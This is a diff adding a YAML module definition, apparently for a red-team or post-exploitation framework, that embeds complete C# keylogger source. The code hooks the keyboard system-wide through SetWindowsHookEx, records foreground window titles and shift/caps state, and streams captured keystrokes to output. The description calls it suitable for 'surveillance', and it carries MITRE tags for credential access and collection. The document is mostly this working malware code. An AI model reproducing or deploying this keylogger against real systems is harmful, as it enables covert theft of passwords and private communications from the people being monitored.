@@ -1,0 +1,418 @@
+name: Keylogger
+authors:
+  - name: Anthony Rose
+    handle: Cx01N
+    link: https://twitter.com/Cx01N_
+description: |
+  This module installs a low-level keyboard hook using SetWindowsHookEx
+  to capture keystrokes system-wide, including foreground window titles and modifier
+  key states. It logs all keys pressed, applies shift/caps-aware formatting, and optionally
+  runs for a specified number of seconds before cleanly exiting. Keystrokes are printed
+  to console output in real time, making this suitable for short-lived or interactive
+  surveillance.
+software: ''
+tactics: [TA0006, TA0009]
+techniques: [T1056.001]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+options:
+  - name: Time
+    description: Specifies the number of seconds to run the keylogger for.
+    required: false
+    value: '0'
+    strict: false
+    suggested_values:
+      - '0'
+      - '10'
+      - '20'
+      - '30'
+      - '60'
+      - '120'
+csharp:
+  UnsafeCompile: false
+  CompatibleDotNetVersions:
+    - Net35
+    - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using System.Text;
+    using System.Timers;
+    using System.Diagnostics;
+    using System.Collections.Generic;
+    using System.Runtime.InteropServices;
+    using Forms = System.Windows.Forms;
+
+    public static class Program
+    {
+        public static void Main(string[] args)
+        {
+            string time = args.Length > 0 ? args[0] : "0";
+            int seconds = int.Parse(time);
+            string result = Keylogger.StartKeylogger(seconds);
+            Console.WriteLine(result);
+        }
+    }
+
+    public class Keylogger
+    {
+        private static HookProc hookproc;
+
+        public static string StartKeylogger(int Seconds)
+        {
+            Console.WriteLine(String.Format("Starting keylogger for {0} seconds.", Seconds));
+
+            IntPtr HookID = IntPtr.Zero;
+            string PreviousActiveWindow = "";
+            hookproc = (nCode, wParam, lParam) =>
+            {
+                try
+                {
+                    var CurrentActiveWindow = GetActiveWindowTitle();
+                    if (CurrentActiveWindow != PreviousActiveWindow)
+                    {
+                        Console.WriteLine("\r\n");
+                        PreviousActiveWindow = CurrentActiveWindow;
+                        Console.WriteLine("\r\n" + DateTime.Now + "\r\n" + CurrentActiveWindow + "\r\n--------------------------\r\n");
+                    }
+                    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+                    {
+                        KbDllHookStruct kbHookStruct = (KbDllHookStruct)Marshal.PtrToStructure(lParam, typeof(KbDllHookStruct));
+                        int vkCode = kbHookStruct.VirtualKeyCode;
+                        bool shifted = GetKeyState(160) < 0 || GetKeyState(161) < 0;
+                        Keys keycode = (Keys)vkCode;
+                        if (!(shifted && KeyDictShift.TryGetValue(keycode, out string append)) && !KeyDict.TryGetValue(keycode, out append))
+                        {
+                            bool capped = GetKeyState(20) != 0;
+                            if ((capped && shifted) || !(capped || shifted))
+                            {
+                                append = keycode.ToString().ToLower();
+                            }
+                            else
+                            {
+                                append = keycode.ToString().ToUpper();
+                            }
+                        }
+                        if (vkCode == 231)
+                        {
+                            append = ((char)kbHookStruct.ScanCode).ToString();
+                        }
+                        Console.Write(append);
+                    }
+                    Console.Out.Flush();
+                }
+                catch (Exception e)
+                {
+                    Console.Error.WriteLine("Keylogger Exception - " + e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
+                }
+                return CallNextHookEx(HookID, nCode, wParam, lParam);
+            };
+            HookID = SetWindowsHookEx(WH_KEYBOARD_LL, hookproc, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
+            if (Seconds <= 0)
+            {
+                Forms.Application.Run();
+            }
+            else
+            {
+                using (Timer timer = new Timer(Seconds * 1000))
+                {
+                    timer.Elapsed += (source, e) =>
+                    {
+                        Console.WriteLine(String.Format("\r\n\r\nFinished Keylogger at {0:HH:mm:ss.fff}", DateTime.Now));
+                        UnhookWindowsHookEx(HookID);
+                        timer.Stop();
+                        Forms.Application.Exit();
+                    };
+                    timer.Start();
+                    Forms.Application.Run();
+                }
+            }
+            return "";
+        }
+
+        private static int WH_KEYBOARD_LL { get; } = 13;
+        private static int WM_KEYDOWN { get; } = 0x0100;
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern int GetKeyState(int nVirtKey);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static string GetActiveWindowTitle()
+        {
+            const int capacity = 256;
+            StringBuilder builder = new StringBuilder(capacity);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, builder, capacity) > 0)
+            {
+                return builder.ToString();
+            }
+            return null;
+        }
+
+        private static IDictionary<Keys, string> KeyDict { get; } = new Dictionary<Keys, string>
+        {
+            { Keys.Attn, "[Attn]" },
+            { Keys.Clear, "[Clear]" },
+            { Keys.Down, "[Down]" },
+            { Keys.Up, "[Up]" },
+            { Keys.Left, "[Left]" },
+            { Keys.Right, "[Right]" },
+            { Keys.Escape, "[Escape]" },
+            { Keys.Tab, "[Tab]" },
+            { Keys.LWin, "[LeftWin]" },
+            { Keys.RWin, "[RightWin]" },
+            { Keys.PrintScreen, "[PrintScreen]" },
+            { Keys.D0, "0" },
+            { Keys.D1, "1" },
+            { Keys.D2, "2" },
+            { Keys.D3, "3" },
+            { Keys.D4, "4" },
+            { Keys.D5, "5" },
+            { Keys.D6, "6" },
+            { Keys.D7, "7" },
+            { Keys.D8, "8" },
+            { Keys.D9, "9" },
+            { Keys.Space, " " },
+            { Keys.NumLock, "[NumLock]" },
+            { Keys.Alt, "[Alt]" },
+            { Keys.LControlKey, "[LeftControl]" },
+            { Keys.RControlKey, "[RightControl]" },
+            { Keys.CapsLock, "[CapsLock]" },
+            { Keys.Delete, "[Delete]" },
+            { Keys.Enter, "[Enter]" },
+            { Keys.Divide, "/" },
+            { Keys.Multiply, "*" },
+            { Keys.Add, "+" },
+            { Keys.Subtract, "-" },
+            { Keys.PageDown, "[PageDown]" },
+            { Keys.PageUp, "[PageUp]" },
+            { Keys.End, "[End]" },
+            { Keys.Insert, "[Insert]" },
+            { Keys.Decimal, "." },
+            { Keys.OemSemicolon, ";" },
+            { Keys.Oemtilde, "`" },
+            { Keys.Oemplus, "=" },
+            { Keys.OemMinus, "-" },
+            { Keys.Oemcomma, "," },
+            { Keys.OemPeriod, "." },
+            { Keys.OemPipe, "\\" },
+            { Keys.OemQuotes, "\"" },
+            { Keys.OemCloseBrackets, "]" },
+            { Keys.OemOpenBrackets, "[" },
+            { Keys.Home, "[Home]" },
+            { Keys.Back, "[Backspace]" },
+            { Keys.NumPad0, "0" },
+            { Keys.NumPad1, "1" },
+            { Keys.NumPad2, "2" },
+            { Keys.NumPad3, "3" },
+            { Keys.NumPad4, "4" },
+            { Keys.NumPad5, "5" },
+            { Keys.NumPad6, "6" },
+            { Keys.NumPad7, "7" },
+            { Keys.NumPad8, "8" },
+            { Keys.NumPad9, "9" },
+        };
+
+        private static IDictionary<Keys, string> KeyDictShift { get; } = new Dictionary<Keys, string>
+        {
+            { Keys.D0, ")" },
+            { Keys.D1, "!" },
+            { Keys.D2, "@" },
+            { Keys.D3, "#" },
+            { Keys.D4, "$" },
+            { Keys.D5, "%" },
+            { Keys.D6, "^" },
+            { Keys.D7, "&" },
+            { Keys.D8, "*" },
+            { Keys.D9, "(" },
+            { Keys.OemSemicolon, ":" },
+            { Keys.Oemtilde, "~" },
+            { Keys.Oemplus, "+" },
+            { Keys.OemMinus, "_" },
+            { Keys.Oemcomma, "<" },
+            { Keys.OemPeriod, ">" },
+            { Keys.OemPipe, "|" },
+            { Keys.OemQuotes, "'" },
+            { Keys.OemCloseBrackets, "}" },
+            { Keys.OemOpenBrackets, "{" }
+        };
+
+        [Flags]
+        private enum Keys
+        {
+            Modifiers = -65536,
+            None = 0,
+            LButton = 1,
+            RButton = 2,
+            Cancel = 3,
+            MButton = 4,
+            XButton1 = 5,
+            XButton2 = 6,
+            Back = 8,
+            Tab = 9,
+            LineFeed = 10,
+            Clear = 12,
+            Return = 13,
+            Enter = 13,
+            ShiftKey = 16,
+            ControlKey = 17,
+            Menu = 18,
+            Pause = 19,
+            Capital = 20,
+            CapsLock = 20,
+            Space = 32,
+            Prior = 33,
+            PageUp = 33,
+            Next = 34,
+            PageDown = 34,
+            End = 35,
+            Home = 36,
+            Left = 37,
+            Up = 38,
+            Right = 39,
+            Down = 40,
+            Select = 41,
+            Print = 42,
+            Execute = 43,
+            Snapshot = 44,
+            PrintScreen = 44,
+            Insert = 45,
+            Delete = 46,
+            Help = 47,
+            D0 = 48,
+            D1 = 49,
+            D2 = 50,
+            D3 = 51,
+            D4 = 52,
+            D5 = 53,
+            D6 = 54,
+            D7 = 55,
+            D8 = 56,
+            D9 = 57,
+            A = 65,
+            B = 66,
+            C = 67,
+            D = 68,
+            E = 69,
+            F = 70,
+            G = 71,
+            H = 72,
+            I = 73,
+            J = 74,
+            K = 75,
+            L = 76,
+            M = 77,
+            N = 78,
+            O = 79,
+            P = 80,
+            Q = 81,
+            R = 82,
+            S = 83,
+            T = 84,
+            U = 85,
+            V = 86,
+            W = 87,
+            X = 88,
+            Y = 89,
+            Z = 90,
+            LWin = 91,
+            RWin = 92,
+            Apps = 93,
+            Sleep = 95,
+            NumPad0 = 96,
+            NumPad1 = 97,
+            NumPad2 = 98,
+            NumPad3 = 99,
+            NumPad4 = 100,
+            NumPad5 = 101,
+            NumPad6 = 102,
+            NumPad7 = 103,
+            NumPad8 = 104,
+            NumPad9 = 105,
+            Multiply = 106,
+            Add = 107,
+            Separator = 108,
+            Subtract = 109,
+            Decimal = 110,
+            Divide = 111,
+            F1 = 112,
+            F2 = 113,
+            F3 = 114,
+            F4 = 115,
+            F5 = 116,
+            F6 = 117,
+            F7 = 118,
+            F8 = 119,
+            F9 = 120,
+            F10 = 121,
+            F11 = 122,
+            F12 = 123,
+            NumLock = 144,
+            Scroll = 145,
+            LShiftKey = 160,
+            RShiftKey = 161,
+            LControlKey = 162,
+            RControlKey = 163,
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct KbDllHookStruct
+        {
+            public int VirtualKeyCode;
+            public int ScanCode;
+            public int Flags;
+            public int Time;
+            public int ExtraInfo;
+        }
+    }
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+  EmbeddedResources: []
